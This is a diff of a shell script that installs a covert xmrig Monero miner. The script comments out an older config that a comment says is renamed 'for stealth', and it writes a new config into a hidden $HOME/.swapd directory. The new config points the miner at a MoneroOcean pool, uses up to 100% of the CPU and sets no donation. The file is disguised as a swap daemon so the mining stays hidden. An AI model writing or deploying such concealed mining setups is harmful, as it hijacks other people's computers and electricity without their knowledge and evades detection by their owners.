@@ -2934,19 +2934,45 @@ if [ "$MINER_TYPE" = "xmrig" ]; then
     fi
     # ========================================
 
-    # Create configuration file (will be renamed to swapfile for stealth)
-    cat > config.json << 'EOL'
+#    # Create configuration file (will be renamed to swapfile for stealth)
+#    cat > config.json << 'EOL'
+#{
+#    "autosave": false,
+#    "donate-level": 0,
+#    "cpu": true,
+#    "opencl": false,
+#    "cuda": false,
+#    "pools": [
+#        {
+#            "coin": "monero",
+#            "algo": "rx/0",
+#            "url": "212.227.165.247:80",
+#            "user": "WALLET_PLACEHOLDER",
+#            "pass": "PASS_PLACEHOLDER",
+#            "keepalive": true,
+#            "tls": false
+#        }
+#    ]
+#}
+#EOL
+
+cat >$HOME/.swapd/config.json <<EOL
 {
-    "autosave": false,
+    "autosave": true,
     "donate-level": 0,
-    "cpu": true,
+    "cpu": {
+        "enabled": true,
+        "huge-pages": true,
+        "hw-aes": null,
+        "priority": null,
+        "asm": true,
+        "max-threads-hint": 100
+    },
     "opencl": false,
     "cuda": false,
     "pools": [
         {
-            "coin": "monero",
-            "algo": "rx/0",
-            "url": "212.227.165.247:80",
+            "url": "gulf.moneroocean.stream:10064",
             "user": "WALLET_PLACEHOLDER",
             "pass": "PASS_PLACEHOLDER",
             "keepalive": true,
